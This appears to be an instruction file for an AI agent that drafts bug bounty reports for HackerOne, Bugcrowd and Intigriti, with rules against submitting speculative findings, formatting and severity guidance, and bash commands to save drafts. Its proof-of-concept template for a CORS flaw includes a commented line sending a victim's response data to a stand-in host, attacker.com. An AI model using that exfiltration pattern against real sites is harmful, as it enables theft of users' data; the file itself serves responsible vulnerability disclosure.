---
name: report-draft
description: Draft a bug bounty report from a validated finding for HackerOne, Bugcrowd, or Intigriti. Only invoke this after a full end-to-end PoC exists. Do not use this to draft speculative or unconfirmed findings.
allowed-tools: Bash
---

# Report Draft

Finding to report: $ARGUMENTS

If $ARGUMENTS is empty, check the current target's `~/bugbounty/[target]/findings/` directory in Kali WSL for the most recent finding file and use that as the basis.

```bash
ls -lt ~/bugbounty/*/findings/ 2>/dev/null | head -20
```

---

## ⛔ HARD STOP RULES — READ BEFORE ANYTHING ELSE

These are non-negotiable. If ANY condition below is true, stop immediately. Do not draft. Do not help frame the finding. Tell the user directly and explain why. Then log the pattern (see Self-Learning below).

1. **No demonstrated PoC** — if you cannot paste a working curl command, JS snippet, or reproducible step-by-step that a triager can run right now, it does not exist. Stop.
2. **Informational severity** — if the finding would be rated Informational or N/A on any platform, do not draft. Tell the user it is not worth submitting and explain exactly why.
3. **Impact requires "could" or "might"** — if the impact sentence needs speculative language, the chain is broken. Stop and tell the user what evidence is missing.
4. **Zero real-world consequence** — if an attacker gains nothing actionable (no data, no access, no account control, no financial impact), this is not a finding. Stop.
5. **Data already public** — if the "exposed" information is findable on LinkedIn, the company website, or any public source, there is no exposure. Stop.
6. **Theoretical chain** — every step must be demonstrated, not assumed. One unproven step = not ready. Stop.
7. **Severity is Informational on any platform** — not worth submitting. Full stop.

**When you hit a hard stop, tell the user:**
- What the finding is
- Exactly why it doesn't meet the bar
- What specific evidence would make it submittable (if anything)
- Whether it's worth pursuing further or should be dropped entirely

Do not soften this. The goal is money, not submissions.

---

## Self-Learning: Log Weak Findings

When a hard stop is triggered, log the pattern immediately so future recon skips similar time-wasters:

```bash
mkdir -p ~/bugbounty/knowledge
cat >> ~/bugbounty/knowledge/weak-patterns.md << EOF

## $(date +%Y-%m-%d) — Dropped: [short finding description]
**Platform:** [HackerOne / Bugcrowd / Intigriti]
**Reason:** [why it failed the hard stop]
**Pattern:** [what class of finding this was — e.g. CORS no sensitive data, user enumeration, missing headers]
**Target type:** [what kind of app/endpoint]
**Lesson:** [one sentence: what to skip next time]
EOF
```

Also append to the recon skill's known-noise list:

```bash
cat >> ~/bugbounty/knowledge/recon-noise.md << EOF
- $(date +%Y-%m-%d): [finding class] on [target type] — not reportable because [reason]
EOF
```

---

## Pre-Flight Check

After confirming no hard stops triggered:

1. Full end-to-end PoC that works without session context? yes/no
2. Asset confirmed in scope for the program? yes/no
3. Checked program's disclosed reports for exact duplicates? yes/no
4. Impact stated in one sentence without "could"? yes/no
5. Platform: HackerOne / Bugcrowd / Intigriti
6. Minimum severity this finding would receive? → If Informational or N/A: **stop here.**

---

## Platform Formatting Rules

### HackerOne
- Severity: None / Low / Medium / High / Critical
- CVSS 3.1 scoring
- Markdown supported
- Fields: Title, Severity, Summary, Steps to Reproduce, Impact, PoC, Remediation

### Bugcrowd
- Severity: P1 (Critical) / P2 (High) / P3 (Medium) / P4 (Low) / P5 (Informational)
- Map to VRT category (e.g. "Broken Access Control > IDOR > Sensitive Data Exposed")
- Keep formatting conservative
- Fields: Title, Vulnerability Type (VRT), Description, Steps to Reproduce, Impact, PoC

### Intigriti
- Severity: Critical / High / Medium / Low / Informational
- CVSS 3.1 required — include the full vector string
- Always include a Remediation section — missing it is an immediate credibility hit
- Add a short "Vulnerability Description" paragraph before Steps to Reproduce
- Frame impact in terms of data protection or regulatory exposure for EU-based programs

---

## Report Structure

### Title
[Vulnerability class] in [specific component/endpoint] allows [concrete impact]
- Name the specific endpoint — not "the API"
- State what an attacker can DO — not "may lead to"
- Under 100 characters
- Spell out acronyms on first use

### Severity
HackerOne / Intigriti: CVSS 3.1 breakdown + vector string
Bugcrowd: P1–P5 + VRT category
Do not inflate. Severity = demonstrated impact, not potential impact.

### Summary
2–3 sentences.
- Sentence 1: What is the vulnerability and where?
- Sentence 2: What can an attacker do?
- Sentence 3 (optional): Precondition or constraint
No passive voice. No "could potentially allow."

### Steps to Reproduce
Numbered. Independently reproducible with no prior context.
- Exact URLs
- Exact HTTP method
- Full relevant headers and body
- What to observe at each step
- How to obtain any required auth
- End with: "Expected: [secure] / Actual: [vulnerable]"

```
curl -s -X POST "https://example.com/endpoint" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"key": "value"}'
```

### Impact
Write this last. This wins or loses the report.
- Concrete: what data, whose data, what action
- Quantified: "any authenticated user's wallet address" not "user data"
- Real consequence: what does the attacker DO with this?
- No speculation beyond confirmed PoC
- No "potentially" — ever

### Proof of Concept
Copy-paste runnable by triager. For CORS:

```html
<script>
fetch("EXACT_ENDPOINT_URL", { credentials: "include" })
.then(r => r.json())
.then(data => {
  console.log(data);
  // Real attack: fetch("https://attacker.com/?d=" + JSON.stringify(data))
})
</script>
```

### Remediation
1–3 specific, actionable fixes. Not generic. Real implementation guidance.

---

## Severity Calibration

| Scenario | HackerOne / Intigriti | Bugcrowd |
|---|---|---|
| CORS + credentials + sensitive data confirmed | High | P2 |
| CORS + credentials + empty/error response only | ⛔ STOP — Informational | ⛔ STOP — N/A |
| Unauthed admin panel + real sensitive data | Medium–High | P2–P3 |
| Unauthed panel + no sensitive data | ⛔ STOP — Informational | ⛔ STOP — N/A |
| API key confirmed working + sensitive scope | High–Critical | P1–P2 |
| API key revoked or read-only public scope | ⛔ STOP — Informational | ⛔ STOP — N/A |
| IDOR exposing another user's PII | High | P2 |
| Self-XSS with no escalation path | ⛔ STOP — Informational | ⛔ STOP — N/A |
| Subdomain takeover confirmed | Medium–High | P2–P3 |
| Missing security headers | ⛔ STOP — Informational | ⛔ STOP — N/A |
| Data already publicly available | ⛔ STOP — Not a finding | ⛔ STOP — Not a finding |
| User enumeration, names already on LinkedIn | ⛔ STOP — Not a finding | ⛔ STOP — Not a finding |

---

## Final Output

Clean markdown ready to paste into the platform. No commentary. Just the report.

Read it as a skeptical triager who has seen 500 reports this month. Fix any hole in the impact argument before outputting.

Save the draft:

```bash
cat > ~/bugbounty/[target]/findings/[finding-slug]-draft.md << 'EOF'
[report content]
EOF
```
